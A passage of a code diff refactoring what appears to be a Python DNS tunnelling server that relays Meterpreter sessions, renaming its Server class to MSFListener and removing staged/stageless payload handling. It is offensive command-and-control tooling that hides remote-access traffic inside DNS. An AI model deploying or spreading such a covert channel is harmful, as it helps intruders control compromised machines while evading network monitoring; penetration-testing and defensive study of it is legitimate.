-            MSFClient.LOGGER.info("Client with id %s is not found.Dropping data", client_id)
-        self.data = ""
-        self.need_read_size = 0
-        
-        if not self.stageles:
-            MSFClient.LOGGER.info("STAGE0 --> STAGE1 (STAGELES)")
-            self._setup_ssl()
-            self.stageles = True
-            
-        else:
-            self.state = MSFClient.INITIAL
+            MSFClient.LOGGER.error("Client for server id %s is not found.Dropping data", self.msf_id)
+        self.msf_data.reset()
+        self.state = MSFClient.IDLE
 
     def write_data(self):
-        client = get_client_by_id(self.client_id)
-        if client:
-            data = client.server_get_data()
+        if self.client:
+            data = self.client.server_get_data()
             if data:
                 MSFClient.LOGGER.info("Send data to server - %d bytes", len(data))
-                self.ssl_socket.write(data)
+                self.working_socket.write(data)
 
     def close(self):
-        self.ssl_socket.close()
+        self.working_socket.close()
 
 
-class Server(object):
+class MSFListener(object):
     SELECT_TIMEOUT = 10
 
-    def __init__(self, listen_addr="0.0.0.0", listen_port=4444, payload_type=False):
-        self.stageles = payload_type
+    def __init__(self, listen_addr="0.0.0.0", listen_port=4444):
         self.listen_addr = listen_addr
         self.listen_port = listen_port
         self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -812,28 +989,22 @@ class Server(object):
                     if cl.want_write():
                         outputs.append(s)
 
-            read_lst, write_lst, exc_lst = select.select(inputs, outputs, inputs, Server.SELECT_TIMEOUT)
+            read_lst, write_lst, exc_lst = select.select(inputs, outputs, inputs, MSFListener.SELECT_TIMEOUT)
 
             # handle input
             for s in read_lst:
                 if s is self.listen_socket:
                     connection, address = s.accept()
                     self.logger.info("Incoming connection from address %s", address)
-                    
-                    if not self.stageles:
-                        self.clients.append(MSFClient(connection, self, self.stageles, '0'))
-                        self.stageles = True
-                    else:
-                        self.clients.append(MSFClient(connection, self, self.stageles, client_id))
-                    
+                    self.clients.append(MSFClient(connection, self))
                 elif s is self.poll_pipe[0]:
-                    self.logger.info("Polling")
+                    self.logger.debug("Polling")
                     s.read(1)
                 else:
                     self.logger.info("Socket is ready for reading")
                     for cl in self.clients:
                         if cl.get_socket() == s:
-                            cl.need_read()
+                            cl.read_new_data()
                         else:
                             self.logger.error("Can't find client for this connection")
 
@@ -842,6 +1013,7 @@ class Server(object):
                 for cl in self.clients:
                     if cl.get_socket() == s:
                         cl.write_data()
+        # close sockets after exit from loop
         self.listen_socket.close()
         for cl in self.clients:
             cl.close()
@@ -850,7 +1022,7 @@ class Server(object):
 
 class TCPRequestHandler(BaseRequestHandlerDNS):
     def get_data(self):
-        data = self.request.recv(8192)#.strip()
+        data = self.request.recv(8192)
         sz = struct.unpack('>H', data[:2])[0]
         if sz < len(data) - 2:
             raise Exception("Wrong size of TCP packet")
@@ -865,7 +1037,7 @@ class TCPRequestHandler(BaseRequestHandlerDNS):
 
 class UDPRequestHandler(BaseRequestHandlerDNS):
     def get_data(self):
-        return self.request[0]#.strip()
+        return self.request[0]
 
     def send_data(self, data):
         return self.request[1].sendto(data, self.client_address)
@@ -877,28 +1049,22 @@ def main():
     parser.add_argument('--lport', default=4444, type=int, help='The Meterpreter port to listen on.')
     parser.add_argument('--domain', type=str, required=True, help='The domain name')
     parser.add_argument('--ipaddr', type=str, required=True, help='DNS IP')
-    parser.add_argument('--type', type=str, required=True, help='type: singles, stagers')
 
     args = parser.parse_args()
     ns_records = []
-    global dns_server
 
     D = DomainName(args.domain + '.')  # Init domain string
     ns_records.append(NS(D.ns1))
     ns_records.append(NS(D.ns2))
-    
-    payload_type = True if args.type.find('single')>=0 else False
-    logger.info("Stageless mode: %s", payload_type)
-    
-    if not payload_type:
-        client = Client('0')
-    
-    dns_server = DnsServer(args.domain, args.ipaddr, ns_records)
-    server = Server('0.0.0.0', args.lport, payload_type)
-    server.start_loop()
-    
-    logger.info("Starting nameserver...")
 
+    DnsServer.create(args.domain, args.ipaddr, ns_records)
+
+    logger.info("Creating MSF listener ...")
+    listener = MSFListener('0.0.0.0', args.lport)
+    listener.start_loop()
+
+    logger.info("Starting nameserver ...")
+    servers = []
     servers.append(SocketServer.UDPServer(('', args.dport), UDPRequestHandler))
     servers.append(SocketServer.TCPServer(('', args.dport), TCPRequestHandler))
 
@@ -919,7 +1085,8 @@ def main():
         logger.info("Shutdown server...")
         for s in servers:
             s.shutdown()
-        server.shutdown()
+        listener.shutdown()
+        logging.shutdown()
 
 
 if __name__ == '__main__':
